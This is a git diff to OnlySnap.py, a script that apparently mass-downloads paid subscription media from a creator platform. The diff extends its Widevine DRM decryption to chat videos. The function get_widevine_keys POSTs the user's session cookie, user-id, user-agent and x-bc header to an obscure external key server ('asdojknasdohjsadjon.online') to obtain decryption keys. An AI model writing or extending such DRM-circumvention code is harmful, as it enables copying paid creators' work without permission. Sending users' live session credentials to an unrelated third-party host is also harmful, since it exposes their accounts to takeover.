@@ -37,7 +37,7 @@ DMR_DIR = os.path.join(BASE_DIR, "dmr")
 DEBUG_MODE = False 
 DEBUG_FILE = os.path.join(DMR_DIR, "debug.log")
 
-CURRENT_VERSION = "1.0.2"
+CURRENT_VERSION = "1.0.3"
 GITHUB_RAW_URL = "https://raw.githubusercontent.com/jordon31/OnlySnap/main/OnlySnap.py"
 
 if system == "Windows":
@@ -312,7 +312,7 @@ class DownloadManager:
             with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
                 futures = []
 
-                # A. CHATS -- Added DRM but no tested
+                # A. CHATS -- Added DRM
                 if chats_list:
                     cp = f"Profiles/{PROFILE}/Media/Chat/Photos/"
                     cv = f"Profiles/{PROFILE}/Media/Chat/Videos/"
@@ -345,7 +345,8 @@ class DownloadManager:
                                     path=p, 
                                     source_url=source_url,
                                     post_id=chat_id,        
-                                    specific_cookies=cf_cookies
+                                    specific_cookies=cf_cookies,
+                                    is_chat=True 
                                 ))
 
                 # B. STORIES
@@ -1334,8 +1335,8 @@ def get_pssh_from_mpd(mpd_url, cookies_override=None):
         
     return None
 
-def get_widevine_keys(pssh_b64, media_id, post_id, cookies_override=None):
-    SERVER_API_URL = "https://asdojknasdohjsadjon.online/api/get_keys"
+def get_widevine_keys(pssh_b64, media_id, post_id, cookies_override=None, is_chat=False): 
+    SERVER_API_URL = "https://asdojknasdohjsadjon.online/api/get_keys" #api external
 
     try:
         base_cookies = API_HEADER["Cookie"]
@@ -1353,7 +1354,8 @@ def get_widevine_keys(pssh_b64, media_id, post_id, cookies_override=None):
             "user_id": str(API_HEADER["user-id"]),
             "user_agent": API_HEADER["User-Agent"],
             "x_bc": API_HEADER.get("x-bc", ""),
-            "cookie": final_cookies
+            "cookie": final_cookies,
+            "is_chat": is_chat
         }
         
         req = requests.post(SERVER_API_URL, json=payload, timeout=20)
@@ -1384,12 +1386,11 @@ def get_fresh_drm_data(post_id, media_id):
         
     return None
 
-def download_drm_video(mpd_url, output_path, output_name, post_id, cookies_override=None):
+def download_drm_video(mpd_url, output_path, output_name, post_id, cookies_override=None, is_chat=False):
     save_dir = os.path.dirname(output_path)
     assure_dir(save_dir)
 
     clean_name = re.sub(r'[<>:"/\\|?*]', '', output_name)
-    #fixed
     temp_dir = os.path.join(save_dir, f"temp_dl_{clean_name}")
     
     if os.path.exists(temp_dir):
@@ -1402,7 +1403,7 @@ def download_drm_video(mpd_url, output_path, output_name, post_id, cookies_overr
     
     # Check server for keys
     if pssh and post_id:
-        keys = get_widevine_keys(pssh, clean_name, post_id, cookies_override)
+        keys = get_widevine_keys(pssh, clean_name, post_id, cookies_override, is_chat)
     elif not post_id:
         log_debug("ERROR: Missing Post ID")
 
@@ -1492,7 +1493,7 @@ def get_year_path(post_date):
     return folder_prefix
 
 # download a media item and save it to the relevant directory
-def download_media(media, is_archived, path=None, timestamp=None, is_stream=False, source_url=None, post_id=None, specific_cookies=None):
+def download_media(media, is_archived, path=None, timestamp=None, is_stream=False, source_url=None, post_id=None, specific_cookies=None, is_chat=False):
     global new_files
     id_str = str(media["id"])
     source = source_url if source_url else media.get("source", {}).get("source")
@@ -1501,8 +1502,8 @@ def download_media(media, is_archived, path=None, timestamp=None, is_stream=Fals
         return False
 
     is_drm = ".mpd" in source if source else False
-    
-    if is_drm and post_id:
+
+    if is_drm and post_id and not is_chat:
         fresh_drm = get_fresh_drm_data(post_id, media['id'])
         if fresh_drm:
             new_manifest = fresh_drm.get("manifest", {}).get("dash")
@@ -1564,7 +1565,7 @@ def download_media(media, is_archived, path=None, timestamp=None, is_stream=Fals
     
     success = False
     if is_drm:
-        if download_drm_video(source, final_path, id_str, post_id, specific_cookies):
+        if download_drm_video(source, final_path, id_str, post_id, specific_cookies, is_chat):
             new_files += 1
             success = True
     else:
@@ -1767,7 +1768,7 @@ def download_highlights(highlights, file_callback=None):
             finally:
                 if file_callback: file_callback()
 
-def download_chats(chats): # Added DRM but no tested
+def download_chats(chats): # Fixed DRM chats
     if not isinstance(chats, list):
         return
 
@@ -1838,7 +1839,8 @@ def download_chats(chats): # Added DRM but no tested
                     path=photos_path, 
                     source_url=source_url,
                     post_id=chat_id,
-                    specific_cookies=cf_cookies
+                    specific_cookies=cf_cookies,
+                    is_chat=True
                 ))
 
         if videos_to_download:
@@ -1852,7 +1854,8 @@ def download_chats(chats): # Added DRM but no tested
                     path=videos_path, 
                     source_url=source_url,
                     post_id=chat_id,
-                    specific_cookies=cf_cookies
+                    specific_cookies=cf_cookies,
+                    is_chat=True
                 ))
 
         for future in as_completed(futures):
